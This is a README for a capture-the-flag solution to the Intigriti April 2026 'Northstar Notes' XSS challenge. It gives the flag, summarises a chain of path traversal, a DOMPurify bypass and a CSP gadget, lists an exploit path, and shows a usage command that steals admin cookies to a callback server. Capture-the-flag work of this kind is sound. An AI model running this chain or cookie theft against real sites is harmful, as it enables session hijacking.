# Intigriti April 2026 Challenge — Northstar Notes XSS

**Flag**: `INTIGRITI{019d955f-1643-77a6-99ef-1c10975ab284}`

Stored XSS via chained path traversal + hidden reader presets API + DOMPurify full-mode bypass + strict-dynamic CSP gadget.

## Quick Summary

The challenge app has a panel manifest loading mechanism where the `panel` URL parameter is not URL-encoded in the client-side fetch URL construction. By using path traversal (`../..`), we redirect the manifest fetch to the reader presets API, which serves attacker-controlled profile data that switches the app to `full` rendering mode. This enables `data-*` attributes through DOMPurify, which feeds a `loadCustomWidget` sink that creates `<script>` elements trusted under `strict-dynamic` CSP.

## Files

- [`solve/writeup.md`](solve/writeup.md) — Detailed writeup with exploitation steps
- [`solve/exploit.py`](solve/exploit.py) — Automated exploit script
- [`solve/screenshots/`](solve/screenshots/) — Proof screenshots

## Usage

```bash
# Trigger alert(document.domain)
python solve/exploit.py

# Steal admin cookies
python solve/exploit.py https://your-callback-server.com
```

## Exploit URL

```
/note/{noteId}/..%2f..%2fapi%2faccount%2fpreferences%2freader-presets%2fxss
```
